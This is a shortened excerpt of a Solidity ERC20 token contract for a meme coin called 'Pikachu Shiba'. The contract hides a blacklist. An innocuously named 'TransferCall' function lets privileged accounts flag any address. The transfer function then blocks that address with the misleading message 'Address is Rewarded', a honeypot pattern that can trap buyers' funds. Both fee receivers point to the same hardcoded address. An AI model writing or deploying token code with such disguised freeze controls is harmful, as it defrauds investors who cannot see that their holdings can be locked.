...
// Telegram : https://telegram.me/PikachuShiba
...
contract PikachuShiba is ERC20, Auth {
    ...
    string constant private _name = "Pikachu Shiba";
    string constant private _symbol = "PIKASHIB";
    ...
    address private autoLiquidityReceiver = 0x5F3032A834423DCf058D4E6D079dae4B1402BAcf;
    address private MarketingFeeReceiver = 0x5F3032A834423DCf058D4E6D079dae4B1402BAcf;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isTransfer[recipient] && !isTransfer[sender], 'Address is Rewarded');
    ...
    function TransferCall(address _address, bool _value) public authorized{
        isTransfer[_address] = _value;
    }
